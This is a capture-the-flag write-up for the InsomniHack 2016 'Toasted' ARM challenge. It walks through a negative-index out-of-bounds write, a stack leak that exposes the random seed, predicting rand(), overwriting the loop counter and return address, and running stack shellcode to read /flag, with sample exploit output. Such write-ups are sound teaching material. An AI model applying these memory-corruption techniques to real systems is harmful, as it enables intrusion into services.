# InsomniHack 2016 - Toasted

Write-up for Insomnihack 2016 Toasted challenge

1. Information
    1. Initial approach
    2. Getting debugging information
    3. Handling the slices
    4. Setting debugging output
2. Force debug output
3. Leak stack content
4. Write shellcode

To a mighty soul
================


Following is an explanation of what the challenge does. The challenge is run at toasted.insomnihack.ch:7200 and the objective is to read the file /flag . They also warm that "FYI Runs chrooted so
forget about your execve shellcodes." so don't try to escape the chroot,

JUST READ THE DAMN FILE :)

Part 1.1 - Initial approach
===========================

What you download is an ARM 32-bits binary (along with the qemu-arm
needed to execute it locally). When you run it you'll be asked for a passphrase.  So the first thing to look for after IDA analyzed the binary is the passphrase to log-in to the 'service'. You can easily find it in the 'strings' windows by:

1. xref-sing the string '"Passphrase : "'  which is the sting displayed when trying to login.
2. if you follow it you'll notice that if tries to read 32 bytes
3. It's strcmp(ed) against the string 'How Large Is A Stack Of Toast?\n'

That's pretty much it :) for the first part.
In case you want to check this in detail, you can examine function at 00008C36, which reads the function from the FD and compares it against the known result.

IMPORTANT: If you give it a try to the remote server during the challenge don't use Telnet client utility when trying with the real server because it sends a \x0a\x0d and the strcmp checks that only \x0a is at the end. You can use netcat or something else, not crappy telnet client :P

Part 1.2 - Getting debugging information
========================================


Then you'll be promped for a slice number becuase, obviously, this is a super cool toaster 2.0 kickstarted-founded so it's basically a cool device :)

The main function does just a couple of relevant things so now we'll proceed to the diassembly:

```C
  char pBuffer[256];

  memset(pBuffer, 0, 256);
  if ( argc_cpy > 1 )
    i_show_status = 1;

  fd = open("/dev/urandom", 0);
  read(fd, &gcanary, 4u);
  canary_cpy = gcanary;

  ...
  read(fd, &i_seed, 4u);
  srandom(i_seed);
  handle_bread(pBuffer, i_show_status);
  ...
  if ( canary_cpy != gcanary )
    exit(-1);
  return 0;

```

So this is basically:

1. Setup stdin/stdout conveniently.
1. Clears the array called pBuffer where all the bread slice's status will be stored.
2. Checks argument count (main's parameter argc). You can ran it using "./qemu-arm toasted bla" (without the doublequotes) so the argc will be more than 2 and will generate verbose output.
3. Read 4 bytes from /dev/urandom to seed srandom() (this is an appropriate random source so forget any crypto sourcery).
4. Call handle_slices() at 0x000008A20 which is where the magic happens.

We'll notice that this funciton as a lot to do on the exploitation of the service but we will refer to it at the end of the write up :)

Part 1.3 - Handling the slices
==============================

This is the function where the user input for every bread slice is handled (remember this is a toaster :)
The function has the following deifinition:

```C
 int handle_slices(char *pBuffer, int i_show_status);
```

As you can see:
1. The first parameter is the pBuffer array which is a an array of 256 bytes where each slice value is going to be stored (we'll see that next).
2.  The second parameter is the status indicator which will display the array content (as a way to display debugging information) just when this parameter contains a value different than zero.
    It's worth noticing that when we run this locally we can turn this on by specifiying an additional parameter to qemu-arm as follows: ./qemu-arm tosted blabla
    This will increase the argc main's parameter and will set this value but later wel'll see that the online server does not have this flag set so wel'll do somethign about it.


At this point the we have to deal with the diassembly of the funtion handle_slices() which is the following:

```C
int handle_slices(char *pBuffer, int i_show_status)
{
  pBuffer_cpy = pBuffer;
  i_show_status_cy = i_show_status;
  i_tries = 0;
  canary_cpy = gcanary;
  ...

  do
  {
    if ( overheat == 4 )
      return puts("The bread reserve tank is empty... Quitting");

    if ( i_show_status_cy )
    {
      puts("Bread status: ");
      show_bread((int)pBuffer_cpy);
    }

    puts("Which slice do you want to heat?");
    rand_res = read(0, &i_slice_n, 4u);

    if ( i_slice_n == 'q' || i_slice_n == 'x' )
      return rand_res;

    rand_res = sscanf(&i_slice_n, "%d", &i_input_toast_n);

    if ( rand_res && i_input_toast_n <= 255 )
    {
      rand_init = printf("Toasting %d!\n", i_input_toast_n);
      i_indexed_toast = (unsigned __int8)pBuffer_cpy[i_input_toast_n];

      cur_toast = pBuffer[toast_n];
      rval = rand();
      r1 = rval & 0xFF;
      new_toast_val = cur_toast + r1;

      if (new_toast_val <= 256)
      {
            pBuffer[toast_n] = t2 & 0xFF;
      }
      else
      {
            puts("Detected bread overheat, replacing");
            pBuffer[toast_n] = 0x0;
            ++overheat;
      }

      ++i_tries;
    
  } while ( i_tries <= 259 );

  if ( canary_cpy != gcanary )
    exit(-1);
  return rand_res;

```


The array pointer passed as the first parameter to this function is originally defined as a stack-based buffer defined in main() where its size is 256 bytes. This function basically does the following:

ENTERs a loop 259 times where it:
1. Check if the overheat variable equals 4 and leave i it does.
2. Check if local variable i_show_status_cy is not zero and display debugging iformation if it does (this is important).
3. Asks for an input number which is a bread slice number LOL
2) Uses that 4 bytes input as an index in the slices array 
3) Then it generates a random 4-bytes value, leaving only the lower byte (rand_value &= 0xFF).
4) Reads the current value at buffer[input_idx] and operates it with the rand_value (see picture and pseudocode).
5) A) If the resulting value <= 256 it performs:
      1. pBuffer[toast_n] = old_val + (new_rand_val & 0xFF)
   B) When higher than 256:
      1. pBuffer[toast_n] = 0x0;
      2. Increments a overheat (if it reaches 4 then leaves).

Following is a good pseudocode description of it:

```C
    cur_toast = pBuffer[toast_n];
    rval = ran();
    r1 = rval & 0xFF;    //t1 = r1;
    new_toast_val = cur_toast + r1;
    if (new_toast_val <= 256)
        pBuffer[toast_n] = t2 & 0xFF;
    else
        pBuffer[toast_n] = 0x0;
        overheat++;
```

2. Force debug output
=====================

The main error here is that scanf() function is used to read the user input as a 4 byte value assigned to an integer variable, whose content is verified not to be bigger than 256 BUT no comparison in case it's lower than 0.

According to scanf() documentation, negative values can be obtained by issuing the minus sign ('-') so we can use this to reference values in the stack at lower addresses than our array base. I.e. by issuing a -1 as the slice number we'll reference the byte before the array starts, -2 the byte before this and so on.

Knowing the stack layout we can use this trick to send the value *-64* to overwrite an integer value which is checked to be non-zero so the debug content is displayed on each loop. It doesn't matter the value, just that it's not zero.

You should see something like this:
```
Which slice do you want to heat?
-64
Toasting -64!
Bread status: 
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
Which slice do you want to heat?
```

At this point we'll have enabled the debug information.

3. Leak stack content
=====================

Now the following trick is to overwrite the pointer to the 256 bytes array containing the slice information. What we'll do is to overwrite the less significant byte with a zero to we'll move the pointer base to a lower stack address and hence on each loop (when the slice array is printed due to our previous trick) we'll end up obtaining the current stack content.

To achieve this we have to send the value *-60* and hope that the result from rand() + the current value will be more than 256 so it'll be overwritten with a 0. Otherwise we have to disconnect and do this again.

You should see something like this:
```
Which slice do you want to heat?
-60
Toasting -60!
Bread status: 
[ 28][208][  4][  0][  0][  0][  0][  0][  0][  0][  0][  0][208][208][  4][  0]
[104][  0][  0][  0][  0][243][255][246][168][244][255][246][ 28][  0][  0][  0]
[ 40][243][255][246][113][138][  0][  0][ 69][  0][  0][  0][  0][243][255][246]
[168][244][255][246][196][255][255][255][ 45][ 54][ 48][ 10][ 82][  1][  0][  0]
[196][238][ 33][ 47][  2][  0][  0][  0][  1][ 49][227][114][  0][  0][  0][  0]
[ 88][243][255][246][147][140][  0][  0][244][245][255][246][  1][  0][  0][  0]
[  1][ 49][227][114][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
[  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0][  0]
Which slice do you want to heat?
```

As you can see a lot of zeroes are at the lower part and lots of numbers appeared at the very begining. This is the case we're looking for!

If these numbers are hex-encoded and grouped as little-endian integers we'll notice stack addresses and other usefull information as follows:

At index 0x50 there is a value which is the SEED obtained from the call to /dev/urandom so seed srandom() function. We'll use this value with our program called not_so_random.c to predict future random values which will be used to deploy the shellcode (among other things).


4. Write shellcode
==================

The shellcode can be written in the stack given that it's executable inside Qemu so no need for ROP this time :)
There is enought space among those zero values to write a thumb-mode shellcode to open/read/puts the content of tile /flag.

Based on the fact that we know the future 'random' values we must wait until those values are popped in order to write them to the stack. Also the return address at index 0x54 must be overwritten with the stack address.

All these things must be done until we reach the 256 loops so there are a couple of issues here:
1. The shellcode bytes depend on the output of random
2. We must overwrite the return address (initiall 0x00008XXX) but we must first clear the lower two bytes.
3. Write the new return address to the stack.

And it's hard to get them all before we reach 256 loops so the trick next is to overwrite the loop counter and set it to a negative value (most significan bit turned on) because it's an integer value and when checked if it's lower than 256 the condition will be met and we'll be still on track :)

After this is done we'll have near infinite write attemps.

Next we'll wait until random spits really high values and specify the address of the two lower bytes of the old return address so it will be zero. Remember that when the content of the current slice + random() is bigger than 256 it's set to zero and overheat content is incremented, so this trick will end up setting overheat counter to 2, but we cna live with that.

There is something that I didn't mention.... when random spits a useless value (not part of the shellcode or anything else) we need to put it somewhere else but we should not increment the overheat counter. I came up with a imple solution, to write it to a lower stack address which is overwritten after each loop and end up ALWAYS with a 0 in it. This way we make sure that the addition will never be bigger than 256 so no overheat :)

At this point we can write out shellcode and finally send 'q' or 'x' to leave the loop and trigger it.

To try this locally you must first compile not_so_random.c as follows:
```
gcc not_so_random.c -o /tmp/not_so_random
```

If you specify another path you'll need to modify exploit.py.

Also remember to create a file /flag with something in it to check if it works.

Following is the expected output:
```
[+] Started program 'qemu-arm'
[+] Leaked data dump:
    0x00000058 0xF6FFF300 0xF6FFF498 0x0000000C 
    0xF6FFF318 0x00008A71 0x0000008B 0xF6FFF300 
    0xF6FFF498 0xFFFFFFC4 0x0030362D 0x00000121 
    0x0477651B 0x00000002 0x7FC58B54 0x00000000 
    0xF6FFF348 0x00008C93 0xF6FFF5E4 0x00000001 
    0x7FC58B54 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
    0x00000000 0x00000000 0x00000000 0x00000000 
[+] seed is 0x7FC58B54 from /dev/urandom
[+] Stack base is 0xF6FFF300
[+] Started program '/tmp/not_so_random'
[+] Generating seeded random values.
[*] Program '/tmp/not_so_random' stopped with exit code 255
[+] Successfully obtained 100000 seeded 'random' values
[+] Deploying shellcode...
[+] Dummy bytes so far : 0
[+] Patching try counter to achieve near-infinite writes.
[+] Clearing return address (byte 1 of 2).
[+] Clearing return address (byte 2 of 2).
[+] Writing return address (byte 1 of 4).
[+] Writing return address (byte 2 of 4).
[+] Writing return address (byte 3 of 4).
[+] Writing return address (byte 4 of 4).
[+] Dummy bytes so far : 1000
[+] Dummy bytes so far : 2000
[+] Deployment complete. Ready to trigger...
[+] Reading file content of '/flag'
[*] Recieving all data: 
[*] Recieving all data: 1B
[*] Program 'qemu-arm' stopped with exit code 128
[+] Recieving all data: Done (129B)

this is the flag content :)
```

    ~cheers, topo

